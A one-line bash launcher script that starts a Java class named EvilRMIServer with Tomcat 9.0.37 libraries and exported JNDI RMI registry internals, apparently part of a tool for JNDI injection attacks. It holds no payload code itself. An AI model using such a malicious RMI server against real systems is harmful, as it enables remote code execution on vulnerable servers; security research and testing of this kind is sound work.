#!/bin/bash
java --add-modules jdk.naming.rmi --add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED  -cp ./deps/tomcat-catalina-9.0.37.jar:build org.rxb.EvilRMIServer $@
